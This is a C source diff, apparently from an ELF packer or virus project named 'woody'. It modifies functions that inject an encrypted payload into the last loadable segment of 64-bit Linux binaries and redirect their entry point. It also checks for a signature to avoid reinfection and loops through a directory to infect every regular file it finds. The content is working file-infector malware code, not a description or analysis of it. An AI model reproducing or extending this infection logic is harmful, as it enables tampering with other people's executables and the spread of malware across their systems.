@@ -54,26 +54,28 @@ static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 	*n = (*n) + add;
 }
 
-void update(char *b, size_t n, size_t old_entry, size_t entry){
+void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt){
 	//add a few information about himself
 	Elf64_Ehdr *bh = (void*)b;
 	size_t pos = 0/*elf_offset_entry(b, n)*/;
 	//modifying 2bit after
 	size_t *p = ((size_t *)(char*)(b + pos + DATA));
 	p[0] = max(old_entry,entry) - min(old_entry,entry);
-	p[1] = entry - pos;
+	struct s_opt *p_opt = (struct s_opt*)(((char *)b+8));
+	p_opt[0] = opt;
+	//p[1] = entry - pos;
 	//printf("diff: %zx, size: %zx\n", entry - pos, n);
-	p[2] = n;
+	//p[2] = n;
 	//size_t ok = max(text_addr,entry) - min(text_addr,entry);
 	//p[3]=ok;
 	//p[4] = text_length;
 	//inserting KEY
-	p[5] = ((size_t*)KEY)[0];
-	p[6] = ((size_t*)KEY)[1];
-	encrypt((char*)(p+7), 15, (uint32_t*)KEY);
+	p[3] = ((size_t*)KEY)[0];
+	p[4] = ((size_t*)KEY)[1];
+	encrypt((char*)(p+5), 15, (uint32_t*)KEY);
 }
 
-static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, size_t crypt_len){
+static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
 	Elf64_Ehdr *h = (void*)*s;
 	Elf64_Phdr *ph = (*(void**)s) + h->e_phoff;
 
@@ -94,17 +96,14 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 	}
 	size_t pos = ph[x].p_offset + ph[x].p_filesz;
 	_insert(s, n, pos, b, bn);
-	println("OK>");
-	printnbln(crypt_off);
-	printnbln(crypt_len);
 	encrypt(((*s) + pos + 1 + crypt_off), crypt_len, (uint32_t*)KEY);
 	//reset it
 	elf_shift_offset(*s, *n, pos, bn);
 	elf_update_flags_of_load_segments(*s, *n);
 	elf_change_size_last_load_segment(*s, *n, bn);
-	elf_set_off_entry(*s, *n, pos + 1 /*+ elf_offset_entry(b, bn)*/);
+	elf_set_off_entry(*s, *n, pos + 1);
 	h = (void*)*s;
-	update((*s) + pos + 1, bn, old_entry, h->e_entry);
+	update((*s) + pos + 1, bn, old_entry, h->e_entry, opt);
 	return TRUE;
 }
 
@@ -116,10 +115,10 @@ int check_already_packed(char *s, size_t n){
 	Elf64_Ehdr *h = (void*)s;
 	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
 	//check if size is enoug
-	if (entry + DATA + 9*sizeof(size_t) + len >= n)
+	if (entry + DATA + 7*sizeof(size_t) + len >= n)
 		return fail("invalid entry point");
 	size_t *p = ((size_t *)(char*)(s + entry + DATA));
-	if (sncmp((char*)(p+9), sig, slen(sig)) == 0)
+	if (sncmp((char*)(p+7), sig, slen(sig)) == 0)
 		return fail("already packed");
 	return TRUE;
 }
@@ -137,7 +136,7 @@ char *debug_name(char *fname){
 	return s;
 }
 
-int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, int force){
+int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
 	char *s; size_t n;
 			println("OK");
 	if (!fget(fname, &s, &n))
@@ -146,7 +145,7 @@ int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, siz
 	if (!check_already_packed(s, n)) return FALSE;
 
 	//after insert, update data
-	if (!_infect(&s,&n, b, bn, crypt_off, crypt_len))
+	if (!_infect(&s,&n, b, bn, crypt_off, crypt_len, opt))
 		return FALSE;
 	if (!fput(outname, s, n))
 		return fail("failed to save to woody");
@@ -155,7 +154,7 @@ int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, siz
 
 #define LIM 1024
 
-int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt_len){
+int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
 	struct linux_dirent *d;
 	char		*p;
 	char		tmp[LIM];
@@ -168,7 +167,7 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 		if (d_isfile(d)){
 			add_base((char *)tmp, dirname, d->d_name, LIM);
 			print(">>>>: ");println(tmp);
-			infect(tmp, debug_name(tmp), b, bn, crypt_off, crypt_len, FALSE);
+			infect(tmp, debug_name(tmp), b, bn, crypt_off, crypt_len, opt);
 		}
 		x += d->d_reclen;
 	}
